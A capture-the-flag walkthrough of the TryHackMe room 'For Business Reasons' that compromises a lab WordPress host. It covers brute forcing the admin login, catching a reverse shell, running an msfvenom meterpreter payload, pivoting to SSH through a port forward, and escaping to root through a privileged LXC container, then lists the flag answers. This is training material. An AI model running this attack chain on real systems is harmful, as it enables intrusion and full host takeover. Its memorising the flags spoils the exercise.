# For Business Reasons

In your network scan, you found an unknown VM....

[For Business Reasons](https://tryhackme.com/room/forbusinessreasons)

## Topic's

- Network Enumeration
- Web Enumeration
- Enumeration (Wordpress)
- Brute Forcing (Wordpress)
- Exploitation (Wordpress)
- Security Misconfiguration
- Stored Passwords & Keys
- Network Tunneling
- Exploitation (LXC)

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 For Business Reasons

You find a Host run by MilkCo\*, run by a competent but not perfect team of sysadmins... But teams make mistakes.

Immature teams often do things like have all the elements of security like strict firewalls but then throw it all away by not understanding a technology or using shared passwords.

This is a hyper-realistic room. This room also features a difficult pivot.

\*_MilkCo is totally made up._

```
kali@kali:~/CTFs/tryhackme/For Business Reasons$ sudo nmap -A -sC -sV -sS -O 10.10.133.94
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-15 21:41 CEST
Nmap scan report for 10.10.133.94
Host is up (0.033s latency).
Not shown: 998 filtered ports
PORT   STATE  SERVICE VERSION
22/tcp closed ssh
80/tcp open   http    Apache httpd 2.4.38 ((Debian))
|_http-generator: WordPress 5.4.2
| http-robots.txt: 1 disallowed entry
|_/wp-admin/
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: MilkCo Test/POC site &#8211; Just another WordPress site
Aggressive OS guesses: HP P2000 G3 NAS device (91%), OpenWrt 12.09-rc1 Attitude Adjustment (Linux 3.3 - 3.7) (90%), Linux 3.16 - 4.6 (90%), Linux 3.2 (90%), Linux 2.6.26 - 2.6.35 (89%), Linux 2.6.32 - 3.13 (89%), Linux 2.6.32 - 3.4.1 (89%), Linux 3.0 (89%), Linux 3.3 (89%), Linux 2.6.32 - 3.1 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   32.53 ms 10.8.0.1
2   32.62 ms 10.10.133.94

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.34 seconds
```

```
kali@kali:~/CTFs/tryhackme/For Business Reasons$ gobuster dir -u 10.10.133.94 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.133.94
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/15 21:42:32 Starting gobuster
===============================================================
/images (Status: 200)
/rss (Status: 301)
/0 (Status: 301)
/feed (Status: 301)
/atom (Status: 301)
/wp-content (Status: 301)
/rss2 (Status: 301)
/wp-includes (Status: 301)
/mysql (Status: 301)
/rdf (Status: 301)
/page1 (Status: 301)
/' (Status: 301)
/%20 (Status: 301)
Progress: 4034 / 220561 (1.83%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/10/15 21:45:33 Finished
===============================================================
```

[http://10.10.133.94/robots.txt](http://10.10.133.94/robots.txt)

```
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
```

```
kali@kali:~/CTFs/tryhackme/For Business Reasons$ wpscan --url 10.10.133.94 --enumerate vp,vt,u,dbe
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.1
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.133.94/ [10.10.133.94]
[+] Started: Thu Oct 15 21:45:37 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.38 (Debian)
 |  - X-Powered-By: PHP/7.2.33
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://10.10.133.94/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.133.94/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://10.10.133.94/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.133.94/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Latest, released on 2020-06-10).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.133.94/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.4.2'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.133.94/, Match: 'WordPress 5.4.2'

[i] The main theme could not be detected.

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:06 <===============> (329 / 329) 100.00% Time: 00:00:06

[i] No themes Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:00 <======================> (36 / 36) 100.00% Time: 00:00:00

[i] No DB Exports Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <===================================================================================================================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] sysadmin
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://10.10.133.94/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Rss Generator (Aggressive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Thu Oct 15 21:48:59 2020
[+] Requests Done: 417
[+] Cached Requests: 5
[+] Data Sent: 93.299 KB
[+] Data Received: 328.199 KB
[+] Memory used: 189.023 MB
[+] Elapsed time: 00:03:22
```

```
kali@kali:~/CTFs/tryhackme/For Business Reasons$ wpscan --url 10.10.133.94 --passwords /usr/share/wordlists/rockyou.txt --usernames sysadmin
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.1
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.133.94/ [10.10.133.94]
[+] Started: Thu Oct 15 21:50:30 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.38 (Debian)
 |  - X-Powered-By: PHP/7.2.33
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://10.10.133.94/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.133.94/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://10.10.133.94/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.133.94/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Latest, released on 2020-06-10).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.133.94/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.4.2'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.133.94/, Match: 'WordPress 5.4.2'

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <====================================================================================================================> (21 / 21) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
Trying sysadmin / milkshake Time: 00:00:53 <===============================================================================================================> (1665 / 1665) 100.00% Time: 00:00:53
[SUCCESS] - sysadmin / milkshake

[!] Valid Combinations Found:
 | Username: sysadmin, Password: milkshake

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Thu Oct 15 21:52:09 2020
[+] Requests Done: 1690
[+] Cached Requests: 27
[+] Data Sent: 828.526 KB
[+] Data Received: 1.053 MB
[+] Memory used: 1.015 GB
[+] Elapsed time: 00:01:38
```

`sysadmin:milkshake`

[http://10.10.133.94/wp-admin/plugin-install.php](http://10.10.133.94/wp-admin/plugin-install.php)

```
kali@kali:~/CTFs/tryhackme/For Business Reasons$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.8.106.222] from (UNKNOWN) [10.10.133.94] 38620
Linux 4e4ae262d6e7 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 GNU/Linux
 20:03:31 up 22 min,  0 users,  load average: 0.00, 0.14, 0.55
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@4e4ae262d6e7:/$ whoami
whoami
www-data
www-data@4e4ae262d6e7:/home$ cd /var/www/html
cd /var/www/html
www-data@4e4ae262d6e7:/var/www/html$ ls
ls
flag0.txt
getip
images
index.php
license.txt
lost+found
mysql
note.txt
readme.html
start.log
start_container.sh
test.sh
update.log
update.sh
wordpress_stack.yml
wp-activate.php
wp-admin
wp-blog-header.php
wp-comments-post.php
wp-config-sample.php
wp-config.php
wp-content
wp-cron.php
wp-includes
wp-links-opml.php
wp-load.php
wp-login.php
wp-mail.php
wp-settings.php
wp-signup.php
wp-trackback.php
xmlrpc.php
www-data@4e4ae262d6e7:/var/www/html$ cat flag0.txt
cat flag0.txt
ya7ooShiivagaipi
```

```
www-data@4e4ae262d6e7:/var/www/html$ cat wordpress_stack.yml
cat wordpress_stack.yml
version: '3.1'

services:

  wordpress:
    image: wordpress:php7.2-apache
    restart: always
    ports:
      - 80:80
    environment:
      WORDPRESS_DB_HOST: db
      WORDPRESS_DB_USER: wpdbuser
      WORDPRESS_DB_PASSWORD: Ceixahz5
      WORDPRESS_DB_NAME: wpdb
    volumes:
      - /data:/var/www/html/

  db:
    image: mysql:5.7
    restart: always
    environment:
      MYSQL_DATABASE: wpdb
      MYSQL_USER: wpdbuser
      MYSQL_PASSWORD: Ceixahz5
      MYSQL_RANDOM_ROOT_PASSWORD: '1'
    volumes:
      - /data/mysql:/var/lib/mysql

volumes:
  wordpress:
  db:
```

```
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.8.106.222 LPORT=9002 -f elf > shell.elf
```

```
kali@kali:~/CTFs/tryhackme/For Business Reasons$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.8.106.222] from (UNKNOWN) [10.10.133.94] 38664
Linux 4e4ae262d6e7 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 GNU/Linux
 21:06:12 up  1:25,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@4e4ae262d6e7:/$ clear
clear
TERM environment variable not set.
www-data@4e4ae262d6e7:/$ cd /tmp
cd /tmp
www-data@4e4ae262d6e7:/tmp$ ls
ls
nc
netcat
pear
shell.elf
tmp
www-data@4e4ae262d6e7:/tmp$ ./shell.elf
./shell.elf
```

```
kali@kali:~/CTFs/tryhackme/For Business Reasons$ sudo msfconsole -q
[sudo] password for kali:
msf5 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload linux/x64/meterpreter_reverse_tcp
payload => linux/x64/meterpreter_reverse_tcp
msf5 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (linux/x64/meterpreter_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf5 exploit(multi/handler) > set LHOST tun0
LHOST => 10.8.106.222
msf5 exploit(multi/handler) > set LPORT 9002
LPORT => 9002
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.8.106.222:9002
[*] Meterpreter session 1 opened (10.8.106.222:9002 -> 10.10.133.94:48290) at 2020-10-15 23:07:43 +0200

meterpreter > route

IPv4 network routes
===================

    Subnet      Netmask        Gateway     Metric  Interface
    ------      -------        -------     ------  ---------
    0.0.0.0     0.0.0.0        172.18.0.1  0       eth2
    10.0.0.0    255.255.255.0  0.0.0.0     0       eth1
    10.255.0.0  255.255.0.0    0.0.0.0     0       eth0
    172.18.0.0  255.255.0.0    0.0.0.0     0       eth2

No IPv6 routes were found.
meterpreter > portfwd -l 22 -p 22 -r 172.18.0.1
Usage: portfwd [-h] [add | delete | list | flush] [args]


OPTIONS:

    -L <opt>  Forward: local host to listen on (optional). Reverse: local host to connect to.
    -R        Indicates a reverse port forward.
    -h        Help banner.
    -i <opt>  Index of the port forward entry to interact with (see the "list" command).
    -l <opt>  Forward: local port to listen on. Reverse: local port to connect to.
    -p <opt>  Forward: remote port to connect to. Reverse: remote port to listen on.
    -r <opt>  Forward: remote host to connect to.
meterpreter > portfwd add -l 22 -p 22 -r 172.18.0.1
[*] Local TCP relay created: :22 <-> 172.18.0.1:22
meterpreter >
```

```
kali@kali:~/CTFs/tryhackme/For Business Reasons$ ssh sysadmin@localhost
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:YWh6/YCN0RzHZZK5fdUZ2EB9I2CQSoW4XAZ5/V+CYUc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
sysadmin@localhost's password:
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

263 packages can be updated.
181 updates are security updates.


Last login: Sun Aug  9 15:30:13 2020 from 192.168.191.131
sysadmin@ubuntu:~$ ls
flag1.txt
sysadmin@ubuntu:~$ cat flag1.txt
osh4loNi
sysadmin@ubuntu:~$
```

```
sysadmin@ubuntu:~$ wget http://10.8.106.222/alpine-v3.12-x86_64-20201015_2323.tar.gz
--2020-10-15 17:24:37--  http://10.8.106.222/alpine-v3.12-x86_64-20201015_2323.tar.gz
Connecting to 10.8.106.222:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3183826 (3.0M) [application/gzip]
Saving to: ‘alpine-v3.12-x86_64-20201015_2323.tar.gz’

alpine-v3.12-x86_6 100%[=============>]   3.04M  3.27MB/s    in 0.9s

2020-10-15 17:24:38 (3.27 MB/s) - ‘alpine-v3.12-x86_64-20201015_2323.tar.gz’ saved [3183826/3183826]

sysadmin@ubuntu:~$ lxc image import ./alpine-v3.12-x86_64-20201015_2323.tar.gz --alias myimage
Image imported with fingerprint: 7924e55c121c96464757d79c0782608607a759a548a4b9f9d58feeb6857500a4
sysadmin@ubuntu:~$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| myimage | 7924e55c121c | no     | alpine v3.12 (20201015_23:23) | x86_64 | 3.04MB | Oct 15, 2020 at 9:25pm (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
sysadmin@ubuntu:~$ lxc init myimage alpine -c security.privileged=true
Creating alpine
sysadmin@ubuntu:~$ lxc config device add alpine mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to alpine
sysadmin@ubuntu:~$ lxc start alpine
sysadmin@ubuntu:~$ lxc exec alpine /bin/sh
~ # whoami
root
~ # cd /root
~ # ls
~ # cd /mnt/root/
/mnt/root # cd root/
/mnt/root/root # cat root.txt
Kainiy1Onoonoh3j
```

1. What is flag 0?

`ya7ooShiivagaipi`

2. What is the user flag?

`osh4loNi`

3. What is the root flag?

`Kainiy1Onoonoh3j`
